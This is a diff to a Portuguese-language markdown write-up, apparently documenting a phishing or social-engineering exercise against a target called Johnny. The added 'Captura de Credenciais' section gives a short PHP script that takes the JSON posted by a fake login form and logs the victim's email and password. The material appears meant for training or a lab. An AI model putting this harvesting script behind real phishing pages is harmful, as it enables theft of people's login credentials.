@@ -107,8 +107,18 @@ A idéia da mensagem foi induzir Johnny obedecer a ordem de um funcionário de h
 
 ## 🔒 Captura de Credenciais
 
-```
-Aqui é necessário criar um arquivo coringa utilizando linguagem de programação, php neste caso do servidor apache que será referenciado ao executar a requisição POST do formulário falso aplicando a lógica que captura as credenciais
+Aqui é necessário criar um arquivo coringa utilizando linguagem de programação, php neste caso do servidor apache que será referenciado ao executar a requisição POST do formulário falso aplicando a lógica que captura as credenciais. Ex.:
+
+```PHP
+<?php
+$raw = file_get_contents("php://input");
+$data = json_decode($raw, true);
+
+error_log("EMAIL: " . $data["email"]);
+error_log("PASSWORD: " . $data["password"]);
+
+echo "OK";
+?>
 ```
 
 ---
